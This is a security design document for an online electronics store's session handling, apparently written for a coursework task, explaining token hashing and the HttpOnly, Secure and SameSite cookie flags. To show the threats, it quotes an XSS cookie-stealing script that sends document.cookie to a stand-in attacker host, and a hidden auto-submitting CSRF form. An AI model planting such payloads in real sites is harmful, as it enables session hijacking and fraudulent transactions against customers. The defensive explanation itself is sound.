# Cookie Flags & Session Architecture Documentation

**Application:** DG Tech Store (Shop ATF 03, Banex Plaza, Wuse 2, Abuja)  
**Document:** `docs/sessions.md`  
**Task:** Task 5 — Step 1: Sessions, Built and Understood  

---

## 1. Architectural Overview

At DG Tech Store, authentication state is maintained using cryptographically secure, random 256-bit session tokens generated via `node:crypto.randomBytes(32)`.

To protect customers applying for high-value phone and laptop hire-purchase financing in the active commercial environment of Banex Plaza, the storage and transport architecture follows the **Split-Secret Session Token Pattern**:

1. **The Client (Browser):** Receives the raw 256-bit token in a strictly configured HTTP cookie named `dg_session`.
2. **The Server (Database):** Calculates a SHA-256 digest of the raw token (`crypto.createHash('sha256').update(rawToken).digest('hex')`) and persists only the hash in SQLite (`prisma/dev.db` `Session.sessionToken`).
3. **The Benefit:** If an attacker executes an SQL injection attack or exfiltrates a nightly database backup, the stored hashes cannot be reversed into valid session cookies. Active user sessions remain uncompromised.

---

## 2. The Three Critical Cookie Flags

The session cookie transmitted by `POST /api/auth/login` and `POST /api/auth/verify-otp` enforces all three flags mandated by RFC 6265bis and OWASP session management guidelines:

```http
Set-Cookie: dg_session=4f8a7e3c2b1d9a0f...; Path=/; Max-Age=604800; HttpOnly; Secure; SameSite=Lax
```

Below is the exhaustive security audit of each flag, the exact attack it prevents against DG Tech Store, and the consequence if omitted.

---

### Flag 1: `HttpOnly`

#### What it does:
Instructs the web browser that the `dg_session` cookie cannot be accessed, read, or modified by client-side JavaScript APIs (such as `document.cookie`, `localStorage`, or web worker threads). The cookie is reserved exclusively for HTTP/HTTPS network headers transmitted by the browser engine.

#### Attack it prevents against DG Tech Store:
**Cross-Site Scripting (XSS) Session Hijacking.**  
Suppose a customer, Ahmed Ibrahim, is reviewing user feedback on a refurbished iPhone 15 Pro Max on DG Tech Store’s catalog. If an attacker injects a stored or DOM-based XSS payload into the review comments field (e.g., `<script>fetch('https://evil-hacker.com/steal?c=' + document.cookie)</script>`), the malicious script executes within Ahmed’s browser context. 

With `HttpOnly` enabled, `document.cookie` returns an empty string or excludes `dg_session`. The malicious payload cannot read Ahmed’s session token, completely neutralizing the session hijacking attempt.

#### What happens if omitted:
If `HttpOnly` is omitted, any JavaScript code executing on the domain has complete access to `document.cookie`. An attacker who successfully exploits a single minor content injection bug (e.g., in a third-party chat widget, customer review box, or CDN dependency) can instantaneously exfiltrate every active session cookie from every visiting customer in Banex Plaza. The attacker can clone the token, impersonate Ahmed, view his Bank Verification Number (BVN) and credit score, and divert his part-payment device orders.

---

### Flag 2: `Secure`

#### What it does:
Directs the browser to transmit the `dg_session` cookie only over encrypted TLS/HTTPS connections. The browser is strictly forbidden from including the cookie in unencrypted plaintext HTTP requests.

#### Attack it prevents against DG Tech Store:
**Man-in-the-Middle (MitM) Packet Sniffing on Untrusted Public Wi-Fi.**  
Banex Plaza is an open shopping complex in Wuse 2 with dozens of competing open Wi-Fi access points, mobile hotspots, and network repeaters. When a customer logs into DG Tech Store over a public hotspot (or if an attacker sets up a rogue "Banex_Plaza_Free_WiFi" pineapple router), any plaintext network traffic can be intercepted using tools like Wireshark.

If an attacker tries to downgrade traffic via SSL stripping or tricks Ahmed’s browser into making a plaintext HTTP request to `http://dgtechstore.ng/about`, the `Secure` flag forbids the browser from attaching the `dg_session` cookie to the plaintext packet.

#### What happens if omitted:
If `Secure` is omitted, the browser will attach the sensitive session cookie to any plaintext HTTP request matching the domain. If an attacker sends Ahmed a phishing link to `http://dgtechstore.ng/receipt` or injects an insecure image link (`<img src="http://dgtechstore.ng/logo.png">`) on any webpage Ahmed visits, Ahmed’s browser will transmit the plaintext session cookie over cleartext HTTP. The attacker sniffs the token out of the air and assumes full control of Ahmed’s financial account.

---

### Flag 3: `SameSite=Lax`

#### What it does:
Controls whether the cookie is sent along with cross-site requests. Under `SameSite=Lax`, the cookie is withheld on cross-site subrequests (such as `<img>`, `<iframe>`, or JavaScript `fetch`/`XMLHttpRequest` POST calls initiated by third-party origins), but is preserved when the user follows a standard top-level navigation link (e.g., clicking a link to DG Tech Store from a WhatsApp message or external email).

#### Attack it prevents against DG Tech Store:
**Cross-Site Request Forgery (CSRF).**  
Suppose a customer with an active DG Tech Store session visits an external blog or receives a phishing link on WhatsApp: `https://banex-deals-scam.ng/claim-prize`. That hostile page contains a hidden auto-submitting form:

```html
<form action="https://dgtechstore.ng/api/devices/apply-financing" method="POST">
  <input type="hidden" name="deviceId" value="MACBOOK-PRO-M3-MAX" />
  <input type="hidden" name="guarantorPhone" value="+2348039999999" />
</form>
<script>document.forms[0].submit();</script>
```

Under `SameSite=Lax`, the browser recognizes that this POST request originated from a cross-site origin (`banex-deals-scam.ng`). The browser refuses to include the `dg_session` cookie. The DG Tech Store server receives the request with no session credentials, returns `HTTP 401 Unauthorized`, and aborts the transaction.

#### What happens if omitted (or set to `SameSite=None` without CSRF defenses):
If `SameSite` is omitted, modern browsers default to Lax, but older mobile browsers or non-compliant engines send the cookie on all cross-site requests. An attacker hosting a deceptive website could forge part-payment applications, update profile settings, or trigger fraudulent purchases on behalf of any logged-in DG Tech Store customer who simply views their web page.

---

## 3. Summary Compliance Table

| Cookie Flag | Direct Configuration | Attack Prevented | Impact on DG Tech Store If Omitted |
| :--- | :--- | :--- | :--- |
| **`HttpOnly`** | `HttpOnly` | XSS Session Exfiltration | Attackers read `document.cookie` via injected scripts and hijack customer hire-purchase portals. |
| **`Secure`** | `Secure` | MitM Cleartext Sniffing | Session tokens transmitted in plaintext across public Banex Plaza Wi-Fi routers. |
| **`SameSite`** | `SameSite=Lax` | Cross-Site Request Forgery (CSRF) | Hostile third-party sites submit unauthorized financing contracts and payment attempts. |
| **`Path`** | `Path=/` | Scope Pollution | Restricts cookie to valid domain roots across all customer and administrative routes. |
| **`Max-Age`** | `Max-Age=604800` (7 Days) | Indefinite Token Replay | Prevents dormant sessions from persisting indefinitely without user re-authentication. |

---

## 4. Machine Verification

Machine evidence confirming these properties:
- `evidence/01-two-session-ids.txt`: Confirms 256-bit CSPRNG entropy and SHA-256 database hashing.
- `evidence/02-cookie-flags.png`: Chrome DevTools Application tab screenshot displaying `HttpOnly`, `Secure`, and `SameSite=Lax` flags active on `localhost:3000`.
- `tests/task5-verification.test.ts`: Automated vitest asserting all three flags on every issued cookie.
